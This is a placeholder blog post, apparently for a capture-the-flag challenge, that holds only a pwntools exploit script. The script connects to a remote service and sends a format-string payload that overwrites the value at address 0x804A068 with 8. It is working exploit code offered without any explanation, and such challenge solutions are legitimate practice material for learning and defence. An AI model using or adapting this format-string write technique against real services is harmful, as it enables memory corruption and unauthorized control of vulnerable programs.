占位

暂时只放exp

```python
from pwn import *
import time

pwnme = 0x804A068

value = 8

context.log_level = "debug"



def exec_fmt(payload):
    p = remote("111.198.29.45", "44114")
    p.sendline("leaf")
    time.sleep(1)
    p.recv()
    p.sendline(payload)
    time.sleep(1)
    response = p.recv()

    return response

autofmt = FmtStr(exec_fmt)
payload = fmtstr_payload(10, {pwnme: 8})

p = remote("111.198.29.45", "44114")
p.sendline("leaf")
time.sleep(1)
p.recv()
p.sendline(payload)
time.sleep(1)
print p.recv()

```

